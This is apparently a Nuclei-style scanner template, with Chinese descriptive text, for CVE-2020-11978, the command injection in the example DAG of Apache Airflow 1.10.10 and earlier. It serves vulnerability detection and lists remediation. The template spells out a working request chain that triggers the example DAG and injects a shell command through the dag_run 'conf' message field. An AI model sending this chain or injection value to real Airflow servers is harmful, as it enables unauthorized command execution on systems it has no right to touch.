id: CVE-2020-11978
info:
  name: Apache Airflow <= 1.10.10 - 'Example Dag' Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Apache Airflow默认DAG命令执行漏洞
    在Apache Airflow 1.10.10及更低版本中发现问题。在Airflow附带的一个示例DAG中发现了一个远程代码/命令注入漏洞，该漏洞允许任何经过身份验证的用户作为运行Airflow worker/scheduler的用户运行任意命令（取决于使用的执行器）。如果您已经通过在配置中设置load_examples=False禁用了示例，则您不易受攻击。
  severity: high
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://lists.apache.org/thread.html/r7255cf0be3566f23a768e2a04b40fb09e52fcd1872695428ba9afe91%40%3Cusers.airflow.apache.org%3E

    临时修复方案：
    1、升级到1.10.10之后版本
    2、删除或禁用默认DAG（可自行删除或在配置文件中禁用默认DAGload_examples=False）
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - contains(body_4, "operator":"BashOperator")
    - contains(all_headers_4, "application/json")
  extractors:
  - name: exec_date
    type: regex
    regex:
    - '"execution_date":"([0-9-A-Z:+]+)"'
    group: 1
    part: body
    internal: true
  matchers-condition: and
  raw:
  - |
    GET /api/experimental/test HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
  - |
    GET /api/experimental/dags/example_trigger_target_dag/paused/false HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
  - |
    POST /api/experimental/dags/example_trigger_target_dag/dag_runs HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Content-Type: application/json

    {"conf": {"message": "\"; touch test #"}}
  - |
    GET /api/experimental/dags/example_trigger_target_dag/dag_runs/{{exec_date}}/tasks/bash_task HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
  req-condition: true
